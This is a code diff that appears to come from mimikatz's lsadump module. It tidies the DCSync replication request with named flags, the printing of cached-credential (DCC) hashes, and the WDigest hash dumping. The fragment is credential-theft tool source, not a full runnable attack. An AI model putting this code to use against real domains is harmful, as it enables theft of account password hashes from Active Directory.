@@ -1527,10 +1527,10 @@ NTSTATUS kuhl_m_lsadump_hash(int argc, wchar_t * argv[])
 			if(NT_SUCCESS(kuhl_m_lsadump_get_dcc(dcc, hash, &uUsername, 0)))
 			{
 				kprintf(L"DCC1: "); kull_m_string_wprintf_hex(dcc, LM_NTLM_HASH_LENGTH, 0); kprintf(L"\n");
-					if(NT_SUCCESS(kuhl_m_lsadump_get_dcc(dcc, hash, &uUsername, count)))
-					{
-						kprintf(L"DCC2: "); kull_m_string_wprintf_hex(dcc, LM_NTLM_HASH_LENGTH, 0); kprintf(L"\n");
-					}
+				if(NT_SUCCESS(kuhl_m_lsadump_get_dcc(dcc, hash, &uUsername, count)))
+				{
+					kprintf(L"DCC2: "); kull_m_string_wprintf_hex(dcc, LM_NTLM_HASH_LENGTH, 0); kprintf(L"\n");
+				}
 			}
 		}
 	}
@@ -1841,10 +1841,10 @@ NTSTATUS kuhl_m_lsadump_dcsync(int argc, wchar_t * argv[])
 						if(kull_m_rpc_drsr_getDCBind(&hBinding, &getChReq.V8.uuidDsaObjDest, &hDrs))
 						{
 							getChReq.V8.pNC = &dsName;
-							getChReq.V8.ulFlags = 0x00088030; // urgent, now!, 0x10 | 0x20 is cool too
+							getChReq.V8.ulFlags = DRS_INIT_SYNC | DRS_WRIT_REP | DRS_NEVER_SYNCED | DRS_FULL_SYNC_NOW | DRS_SYNC_URGENT;
 							getChReq.V8.cMaxObjects = 1;
 							getChReq.V8.cMaxBytes = 0x00a00000; // 10M
-							getChReq.V8.ulExtendedOp = 6;
+							getChReq.V8.ulExtendedOp = EXOP_REPL_OBJ;
 
 							RpcTryExcept
 							{
@@ -2022,7 +2022,7 @@ void kuhl_m_lsadump_dcsync_descrUser(ATTRBLOCK *attributes)
 	if(kuhl_m_lsadump_dcsync_findMonoAttr(attributes, ATT_USER_ACCOUNT_CONTROL, &data, NULL))
 	{
 		kprintf(L"User Account Control : %08x ( ", *(PDWORD) data);
-		for(i = 0; i < sizeof(DWORD) * 8; i++)
+		for(i = 0; i < KIWI_MINIMUM(ARRAYSIZE(KUHL_M_LSADUMP_UF_FLAG), sizeof(DWORD) * 8); i++)
 			if((1 << i) & *(PDWORD) data)
 				kprintf(L"%s ", KUHL_M_LSADUMP_UF_FLAG[i]);
 		kprintf(L")\n");
@@ -2111,10 +2111,10 @@ void kuhl_m_lsadump_dcsync_descrUserProperties(PUSER_PROPERTIES properties)
 			else if(RtlEqualUnicodeString(&PrimaryWDigest, &Name, TRUE))
 			{
 				pWDigest = (PWDIGEST_CREDENTIALS) data;
-				for(i = 0; i < pWDigest->NumberOfHashes; i++)
+				for(j = 0; j < pWDigest->NumberOfHashes; j++)
 				{
-					kprintf(L"    %02u  ", i + 1);
-					kull_m_string_wprintf_hex(pWDigest->Hash[i], MD5_DIGEST_LENGTH, 0);
+					kprintf(L"    %02u  ", j + 1);
+					kull_m_string_wprintf_hex(pWDigest->Hash[j], MD5_DIGEST_LENGTH, 0);
 					kprintf(L"\n");
 				}
 			}
